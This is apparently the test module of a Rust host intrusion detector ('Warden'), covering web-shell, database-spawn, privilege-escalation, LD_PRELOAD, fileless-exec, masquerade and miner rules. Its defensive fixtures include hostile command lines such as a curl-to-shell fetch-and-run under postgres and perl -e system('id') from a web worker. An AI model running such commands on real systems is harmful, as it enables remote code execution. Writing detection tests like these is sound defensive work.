        // cron jobs of the web account still count
        o.cgroup = Some("/system.slice/cron.service".into());
        assert!(kinds(&a.on_exec(&o, None)).contains(&"security.web_spawn"));
        assert!(in_login_session("/user.slice/user-0.slice/session-c1.scope"));
        assert!(!in_login_session("/user.slice/user-1000.slice/user@1000.service/app.slice/x.scope"));
    }

    /// A notification command running as `nobody` (one of the default
    /// `web_users`) runs `id`: Warden's own program, not a web worker. The
    /// same tree outside Warden is still a finding.
    #[test]
    fn warden_s_own_commands_are_not_web_workers() {
        let mut a = ProcessAnalyzer::new(&ProcessConfig::default());
        let o = obs("id", "/usr/bin/id", "id -u", 65534, 65534, "nobody", "sh", 65534, "nobody");
        a.rules.own_descendant = |_| true;
        assert!(!kinds(&a.on_exec(&o, None)).contains(&"security.web_spawn"));
        a.rules.own_descendant = |_| false;
        assert!(kinds(&a.on_exec(&o, None)).contains(&"security.web_spawn"));
    }

    #[test]
    fn apache_master_helpers_and_cgi_are_not_webshells() {
        let mut a = ProcessAnalyzer::new(&ProcessConfig::default());
        // master (root) starts a piped logger through sh -c
        let mut o = obs(
            "sh",
            "/usr/bin/dash",
            "sh -c /usr/bin/rotatelogs /var/log/apache2/x 86400",
            0,
            0,
            "root",
            "apache2",
            0,
            "root",
        );
        o.parent_euid = 0;
        assert!(!kinds(&a.on_exec(&o, None)).contains(&"security.web_spawn"));
        // worker (www-data) running an allow-listed CGI script
        let mut cfg = ProcessConfig::default();
        cfg.allowed_children
            .push(warden_core::config::ChildAllow { parent: "apache2".into(), child: "/usr/lib/cgi-bin/**".into() });
        let mut a = ProcessAnalyzer::new(&cfg);
        let o = obs(
            "perl",
            "/usr/bin/perl",
            "/usr/bin/perl /usr/lib/cgi-bin/stats.pl",
            33,
            33,
            "www-data",
            "apache2",
            33,
            "www-data",
        );
        assert!(!kinds(&a.on_exec(&o, None)).contains(&"security.web_spawn"));
        // ... but perl -e from the same worker is not covered by the allowlist
        let o = obs("perl", "/usr/bin/perl", "perl -e system('id')", 33, 33, "www-data", "apache2", 33, "www-data");
        assert!(kinds(&a.on_exec(&o, None)).contains(&"security.web_spawn"));
    }

    /// Spawn a real child and feed its exec to the pipeline.
    fn exec_child(
        p: &mut ExecPipeline,
        lin: &std::sync::Mutex<Lineage>,
        args: &[&str],
        env: Option<(&str, &str)>,
    ) -> Vec<Event> {
        use std::process::{Command, Stdio};
        let mut c = Command::new(args[0]);
        c.args(&args[1..]).stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::null());
        if let Some((k, v)) = env {
            c.env(k, v);
        }
        let mut ch = c.spawn().unwrap();
        // `spawn` returns once the vfork'ed child is inside execve, slightly
        // before the kernel renames it; the real connector event comes after
        // exec completes. Wait for the new name.
        let want = exe_basename(args[0]).to_owned();
        let t = Instant::now();
        while std::fs::read_to_string(format!("/proc/{}/comm", ch.id())).map(|c| c.trim() != want).unwrap_or(false)
            && t.elapsed() < Duration::from_secs(2)
        {
            std::thread::sleep(Duration::from_millis(1));
        }
        std::thread::sleep(Duration::from_millis(2));
        let users = |uid: u32| if uid == 0 { "root".to_owned() } else { format!("u{uid}") };
        let v = p.on_exec(ch.id() as i32, &users, lin);
        let _ = ch.kill();
        let _ = ch.wait();
        v
    }

    #[test]
    fn exec_pipeline_learns_a_fast_path_and_rechecks() {
        let cfg = ProcessConfig { exec_recheck_every: 4, ..Default::default() };
        let mut p = ExecPipeline::new(&cfg);
        let lin = std::sync::Mutex::new(Lineage::new(None, Duration::ZERO, false));
        let sleep = ["sleep", "30"];
        for _ in 0..3 {
            assert!(exec_child(&mut p, &lin, &sleep, None).is_empty());
        }
        assert_eq!((p.stats.full, p.stats.fast), (3, 0), "three clean full analyses first");
        for _ in 0..3 {
            exec_child(&mut p, &lin, &sleep, None);
        }
        assert_eq!((p.stats.full, p.stats.fast), (3, 3));
        exec_child(&mut p, &lin, &sleep, None); // 4th fast-path hit → full re-check
        assert_eq!((p.stats.full, p.stats.fast, p.stats.rechecks), (4, 3, 1));
        assert!(p.stats.parent_hits >= 6, "the parent (this test) came from the cache: {:?}", p.stats);

        // The parent renamed itself: its cache entry is dropped.
        let me = std::process::id() as i32;
        let users = |uid: u32| uid.to_string();
        p.handle(proc_connector::ProcEvent::Comm { pid: me, tgid: me, comm: "x".into() }, -1, &users, &lin);
        let misses = p.stats.parent_misses;
        exec_child(&mut p, &lin, &sleep, None);
        assert_eq!(p.stats.parent_misses, misses + 1);

        // Disabled: always the full analysis.
        let mut off = ExecPipeline::new(&ProcessConfig { exec_fast_path: false, ..Default::default() });
        for _ in 0..5 {
            exec_child(&mut off, &lin, &sleep, None);
        }
        assert_eq!((off.stats.full, off.stats.fast), (5, 0));
    }

    #[test]
    fn exec_fast_path_still_sees_scripts_and_ld_preload() {
        let mut p = ExecPipeline::new(&ProcessConfig { exec_recheck_every: 0, ..Default::default() });
        let lin = std::sync::Mutex::new(Lineage::new(None, Duration::ZERO, false));
        let shell = ["sh", "-c", "sleep 30; :"];
        for _ in 0..4 {
            assert!(exec_child(&mut p, &lin, &shell, None).is_empty());
        }
        assert_eq!((p.stats.full, p.stats.fast), (3, 1));
        // Same shell, but running a script from /tmp: the fast path reads the
        // command line and hands it to the full analysis.
        let d = tempfile::tempdir_in("/tmp").unwrap();
        let script = d.path().join("s.sh");
        std::fs::write(&script, "sleep 30\n").unwrap();
        let v = exec_child(&mut p, &lin, &["sh", script.to_str().unwrap()], None);
        assert!(kinds(&v).contains(&"security.exec_from_writable"), "{:?}", kinds(&v));
        assert_eq!(p.stats.full, 4);

        let root = unsafe { libc::geteuid() } == 0;
        if root {
            let sleep = ["sleep", "30"];
            for _ in 0..4 {
                exec_child(&mut p, &lin, &sleep, None);
            }
            let full = p.stats.full;
            let caught = (1..=LD_PRELOAD_SAMPLE).find(|_| {
                let v = exec_child(&mut p, &lin, &sleep, Some(("LD_PRELOAD", "/nonexistent/evil.so")));
                kinds(&v).contains(&"security.ld_preload")
            });
            assert!(caught.is_some(), "a persistent LD_PRELOAD is seen within {LD_PRELOAD_SAMPLE} execs");
            assert_eq!(p.stats.full, full + 1, "LD_PRELOAD in a root process forces the full analysis");
            exec_child(&mut p, &lin, &sleep, None);
            assert_eq!(p.stats.full, full + 2, "a finding resets the combination");
        }
    }

    #[test]
    fn privilege_changes_and_web_parents_never_take_the_fast_path() {
        let p = ExecPipeline::new(&ProcessConfig::default());
        let mut o = obs("ls", "/usr/bin/ls", "ls", 1000, 1000, "alice", "bash", 1000, "alice");
        assert!(p.fast_candidate(&o));
        o.info.ruid = 0;
        o.info.euid = 0;
        assert!(!p.fast_candidate(&o), "root child of a user parent (sudo/su or an exploit)");
        let mut o = obs("ls", "/usr/bin/ls", "ls", 1000, 0, "alice", "bash", 1000, "alice");
        o.info.suid = 0;
        assert!(!p.fast_candidate(&o), "setuid executable");
        let o = obs("sh", "/usr/bin/dash", "sh -c id", 33, 33, "www-data", "php-fpm8.3", 33, "www-data");
        assert!(!p.fast_candidate(&o), "web worker child");
        let o = obs("sh", "/usr/bin/dash", "sh -c id", 112, 112, "postgres", "postgres", 112, "postgres");
        assert!(!p.fast_candidate(&o), "database child");
        let o = obs("x", "/tmp/x", "/tmp/x", 1000, 1000, "alice", "bash", 1000, "alice");
        assert!(!p.fast_candidate(&o), "binary from a writable directory");
        let o = obs("x", "/usr/bin/x (deleted)", "x", 1000, 1000, "alice", "bash", 1000, "alice");
        assert!(!p.fast_candidate(&o));
    }

    #[test]
    fn creds_from_the_fast_path_keep_setuid_detection() {
        let mut a = ProcessAnalyzer::new(&ProcessConfig::default());
        let mut o = obs("helper", "/usr/local/bin/helper", "helper", 1000, 1000, "alice", "bash", 1000, "alice");
        a.note_creds(o.info.pid, 0, 1000, 1000, 1000);
        o.info.euid = 0;
        let v = a.on_uid(&o, 1000, 0);
        assert_eq!(kinds(&v), ["security.privilege_escalation"]);
        // A process that held root at exec may drop and regain it.
        let mut a = ProcessAnalyzer::new(&ProcessConfig::default());
        a.note_creds(o.info.pid, 0, 0, 0, 0);
        assert!(a.on_uid(&o, 1000, 0).is_empty());
        // After lost events, unverified entries are forgotten (unknown history → quiet).
        let mut a = ProcessAnalyzer::new(&ProcessConfig::default());
        a.note_creds(o.info.pid, 0, 1000, 1000, 1000);
        a.forget_unverified_creds();
        assert!(a.on_uid(&o, 1000, 0).is_empty());
    }

    #[test]
    fn limit_rule_matching() {
        let rule: warden_core::config::LimitRule = toml::from_str(
            "name = 'stuck php'\ncomm = ['php-fpm*']\nusers = ['www-data']\nunits = ['php*-fpm.service']\ncpu_percent = 90.0\n",
        )
        .unwrap();
        let c = CompiledLimit::new(&rule);
        let u = |n: &'static str| move || n.to_string();
        assert!(c.matches("php-fpm8.3", u("www-data"), || Some("/system.slice/php8.3-fpm.service".into())));
        assert!(!c.matches("php-fpm8.3", u("site1"), || Some("/system.slice/php8.3-fpm.service".into())));
        assert!(!c.matches("node", u("www-data"), || None));
        assert!(!c.matches("php-fpm8.3", u("www-data"), || Some("/system.slice/apache2.service".into())));
    }

    #[test]
    fn limit_rule_reads_user_and_cgroup_only_when_needed() {
        let rule: warden_core::config::LimitRule =
            toml::from_str("name = 'big node'\ncomm = ['node']\nmax_rss = '2G'\n").unwrap();
        let c = CompiledLimit::new(&rule);
        // No `users`/`units` in the rule: neither lookup may run.
        assert!(c.matches("node", || panic!("user looked up"), || panic!("cgroup read")));
        // A comm mismatch short-circuits before anything else.
        let rule: warden_core::config::LimitRule =
            toml::from_str("name = 'x'\ncomm = ['php*']\nusers = ['www-data']\nunits = ['php*']\n").unwrap();
        let c = CompiledLimit::new(&rule);
        assert!(!c.matches("node", || panic!("user looked up"), || panic!("cgroup read")));
    }

    #[test]
    fn database_spawning_shell() {
        let mut a = ProcessAnalyzer::new(&ProcessConfig::default());
        let mut o =
            obs("sh", "/usr/bin/dash", "sh -c curl http://x/p | sh", 112, 112, "postgres", "postgres", 112, "postgres");
        o.parent_cgroup = Some("/system.slice/postgresql@16-main.service".into());
        let v = a.on_exec(&o, None);
        let e = v.iter().find(|e| e.kind == "security.db_spawn").unwrap();
        assert_eq!(e.severity, Severity::Critical);
        assert!(!e.actions.is_empty());
    }

    #[test]
    fn root_shell_from_user_process_is_privesc() {
        let mut a = ProcessAnalyzer::new(&ProcessConfig::default());
        let o = obs("sh", "/usr/bin/dash", "/bin/sh", 0, 0, "root", "exploit", 1000, "alice");
        assert!(kinds(&a.on_exec(&o, None)).contains(&"security.privilege_escalation"));
        // sudo is a legitimate broker
        let o = obs("bash", "/usr/bin/bash", "bash", 0, 0, "root", "sudo", 1000, "alice");
        assert!(!kinds(&a.on_exec(&o, None)).contains(&"security.privilege_escalation"));
    }

    #[test]
    fn unknown_suid_and_writable_exec() {
        let mut a = ProcessAnalyzer::new(&ProcessConfig::default());
        let o = obs("rootme", "/tmp/rootme", "/tmp/rootme", 1000, 0, "alice", "bash", 1000, "alice");
        let k = a.on_exec(&o, None);
        assert!(kinds(&k).contains(&"security.unknown_suid_exec"));
        assert!(kinds(&k).contains(&"security.exec_from_writable"));
        let o = obs("passwd", "/usr/bin/passwd", "passwd", 1000, 0, "alice", "bash", 1000, "alice");
        assert!(a.on_exec(&o, None).is_empty());
    }

    #[test]
    fn masquerade_fileless_miner() {
        let mut a = ProcessAnalyzer::new(&ProcessConfig::default());
        let o = obs("kworker/0:2", "/var/tmp/.x/kworker", "[kworker/0:2]", 1000, 1000, "alice", "bash", 1000, "alice");
        assert!(kinds(&a.on_exec(&o, None)).contains(&"security.masquerade"));
        let o = obs("x", "/memfd:x (deleted)", "x", 1000, 1000, "alice", "bash", 1000, "alice");
        assert!(kinds(&a.on_exec(&o, None)).contains(&"security.fileless_exec"));
        // The runtime re-executing itself is legitimate — when the runtime
        // started it; a name alone buys nothing.
        let runc = |parent_exe: Option<&str>, parent_ruid: u32| {
            let mut o = obs(
                "runc:[2:INIT]",
                "/memfd:runc_cloned:/proc/self/exe (deleted)",
                "runc init",
                0,
                0,
                "root",
                "containerd-shim",
                parent_ruid,
                "root",
            );
            o.parent_exe = parent_exe.map(str::to_owned);
            o
        };
        let system = |_: i32, p: &str| p.starts_with("/usr/bin/") || p.starts_with("/usr/sbin/");
        assert!(runtime_memfd(&runc(Some("/usr/bin/containerd-shim-runc-v2"), 0), system));
        assert!(runtime_memfd(&runc(Some("/usr/bin/conmon"), 0), system), "rootless: conmon starts the runtime");
        assert!(
            runtime_memfd(&runc(Some("/memfd:runc_cloned:/proc/self/exe (deleted)"), 0), system),
            "its own children"
        );
        // the same name from a web shell, a shell, an unknown or untrusted parent
        assert!(!runtime_memfd(&runc(Some("/usr/sbin/php-fpm8.3"), 0), system));
        assert!(!runtime_memfd(&runc(Some("/usr/bin/bash"), 0), system));
        assert!(!runtime_memfd(&runc(None, 0), system));
        assert!(!runtime_memfd(&runc(Some("/tmp/runc"), 0), system), "a runc that is not a system binary");
        assert!(!runtime_memfd(&runc(Some("/usr/bin/runc"), 0), |_, _| false), "not root-owned / writable");
        assert!(!runtime_memfd(&runc(Some("/memfd:runc (deleted)"), 1000), system), "a different user's look-alike");
        assert!(!runtime_memfd(&runc(Some("/memfd:x (deleted)"), 0), system));
        // end to end: a process that merely calls itself runc, under a web server
        let mut forged = runc(Some("/usr/sbin/php-fpm8.3"), 33);
        forged.info.comm = "runc".into();
        forged.info.pid = 4301; // (findings are deduplicated per process)
        assert!(kinds(&a.on_exec(&forged, None)).contains(&"security.fileless_exec"));
        // ... and an exe path that contains a runtime's name is not special any more
        let mut o =
            obs("containerd-x", "/tmp/.k/containerd-x (deleted)", "x", 1000, 1000, "alice", "bash", 1000, "alice");
        o.info.pid = 4302;
        assert!(kinds(&a.on_exec(&o, None)).contains(&"security.fileless_exec"));
        let o = obs("xmrig", "/home/alice/xmrig", "xmrig -o pool", 1000, 1000, "alice", "bash", 1000, "alice");
        assert!(kinds(&a.on_exec(&o, None)).contains(&"security.miner"));
    }

    /// The synthetic processes of these tests do not exist: their binary is
    /// judged by its path (the real check also needs the running inode).
    fn by_path(_: i32, exe: &str) -> bool {
        use std::os::unix::fs::MetadataExt;
        let exe = exe.trim_end_matches(" (deleted)");
        ["/usr/sbin/", "/usr/bin/", "/sbin/", "/bin/"].iter().any(|d| exe.starts_with(d))
            && std::fs::metadata(exe).is_ok_and(|m| m.is_file() && m.uid() == 0 && m.mode() & 0o022 == 0)
    }

    #[test]
    fn upgrades_and_real_programs_are_not_attacks() {
        let mut a = ProcessAnalyzer::new(&ProcessConfig::default());
        a.rules.system_binary = by_path;
        // the `watchdog` package's daemon (false positive in 0.10.0)
        let o = obs("watchdog", "/usr/sbin/watchdog", "/usr/sbin/watchdog", 0, 0, "root", "systemd", 0, "root");
        assert!(!kinds(&a.on_exec(&o, None)).contains(&"security.masquerade"));
        let sys = a.rules.system_binary;
        assert!(genuine_program(sys, 1, "ls", "/usr/bin/ls"));
        assert!(!genuine_program(sys, 1, "kworker/0:1", "/usr/bin/ls"));
        assert!(!genuine_program(sys, 1, "ls", "/tmp/ls"));
        // a kernel-thread name on an unrelated binary is still masquerading
        let o = obs("watchdogd", "/usr/bin/ls", "watchdogd", 0, 0, "root", "systemd", 0, "root");
        assert!(kinds(&a.on_exec(&o, None)).contains(&"security.masquerade"));
        // binary replaced by a package upgrade (php8.3 (deleted) in 0.10.0)
        let mut o = obs("php", "/usr/bin/ls (deleted)", "/usr/bin/php ws.php", 1000, 1000, "bob", "systemd", 0, "root");
        o.info.pid = 5001;
        let v = a.on_exec(&o, None);
        assert!(!kinds(&v).contains(&"security.fileless_exec"), "{:?}", kinds(&v));
        let e = v.iter().find(|e| e.kind == "process.stale_binary").unwrap();
        assert_eq!(e.severity, Severity::Notice);
        assert!(e.actions.is_empty());
        assert!(e.details["hint"].as_str().unwrap().contains("systemctl restart php8.3-fpm.service"));
        // removed from a system path, not replaced
        assert_eq!(classify_exe("/usr/bin/warden-no-such-binary (deleted)"), Some(ExeKind::Removed));
        // a dropper that deleted itself from /tmp
        assert_eq!(classify_exe("/tmp/.x/kdevd (deleted)"), Some(ExeKind::DeletedFromWritable));
        assert_eq!(classify_exe("/usr/bin/ls"), None);
    }

    #[test]
    fn uid_transition_rules() {
        let mut a = ProcessAnalyzer::new(&ProcessConfig::default());
        let o = obs("evil", "/home/alice/evil", "evil", 1000, 1000, "alice", "bash", 1000, "alice");
        let _ = a.on_exec(&o, None);
        let v = a.on_uid(&o, 0, 0);
        assert_eq!(kinds(&v), vec!["security.privilege_escalation"]);
        // a daemon that started as root and temporarily dropped privileges
        let mut d = obs("cron", "/usr/sbin/cron", "cron", 0, 0, "root", "systemd", 0, "root");
        d.info.pid = 77;
        let _ = a.on_exec(&d, None);
        assert!(a.on_uid(&d, 0, 1000).is_empty());
        assert!(a.on_uid(&d, 0, 0).is_empty());
    }
}
